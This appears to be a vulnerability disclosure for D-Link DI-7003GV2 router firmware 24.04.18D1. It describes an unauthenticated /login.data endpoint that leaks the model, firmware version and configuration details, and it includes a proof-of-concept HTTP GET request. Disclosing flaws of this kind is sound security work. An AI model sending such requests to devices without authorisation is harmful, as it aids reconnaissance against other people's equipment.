# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 contains an information disclosure vulnerability in the `/login.data` endpoint. This unauthenticated interface allows remote attackers to retrieve sensitive device information, including the model, firmware version, and various configuration details such as the status of mini programs and logo settings.

# Vulnerability details

The processing function for `login.data` interface is `sub_419D04`.

![图 0](img/fcf2f874958d18541ce0c2ed5ff215bdb901cdd70dcc2cd6601d8e23bd2a9943.png)  

The `sub_419D04` function will output sensitive information such as the device model and version.

![图 1](img/42e970f628b98d289843ea9c5972c9ab639d991f2d876eae0bad938c8d456015.png)  


# Poc

```http
GET /login.data HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/fa3943756660d874b097f02a4dcd9c680156f1f520c2ecb5485a451732f60d9f.png)  
